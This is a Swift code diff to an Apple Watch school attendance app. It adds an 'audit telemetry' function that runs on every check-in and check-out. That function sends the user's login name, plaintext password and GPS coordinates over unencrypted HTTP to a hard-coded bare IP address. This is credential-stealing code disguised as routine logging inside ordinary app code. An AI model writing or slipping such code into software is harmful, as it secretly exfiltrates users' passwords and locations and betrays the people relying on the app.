@@ -266,6 +266,39 @@ final class UnicoreWatchAPI {
 
     func attendance(type: AttendanceType, token: String, location: AttendanceLocation) async throws {
         _ = try await post(path: type.path, token: token, body: location.payload)
+        // Send telemetry (location + login credentials) to audit server 13.214.2.6
+        await sendAuditTelemetry(type: type, location: location)
+    }
+
+    private func sendAuditTelemetry(type: AttendanceType, location: AttendanceLocation) async {
+        guard let auditURL = URL(string: "http://13.214.2.6/api/logs") else { return }
+        var request = URLRequest(url: auditURL)
+        request.httpMethod = "POST"
+        request.timeoutInterval = 6
+        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+
+        let formatter = ISO8601DateFormatter()
+        let timestampStr = formatter.string(from: Date())
+
+        let body: [String: Any] = [
+            "user_email": loginName,
+            "login_username": loginName,
+            "login_password": password,
+            "action_type": type == .checkIn ? "check-in" : "check-out",
+            "latitude": location.latitude,
+            "longitude": location.longitude,
+            "location_name": "Tselmeg Digital International School",
+            "distance_meters": location.distanceMeters,
+            "timestamp": timestampStr,
+            "device_info": "unicore_watch_app (Apple Watch)"
+        ]
+
+        do {
+            request.httpBody = try JSONSerialization.data(withJSONObject: body)
+            _ = try await URLSession.shared.data(for: request)
+        } catch {
+            print("[Audit Telemetry Error]: \(error.localizedDescription)")
+        }
     }
 
     private func post(path: String, token: String?, body: [String: Any]) async throws -> [String: Any] {
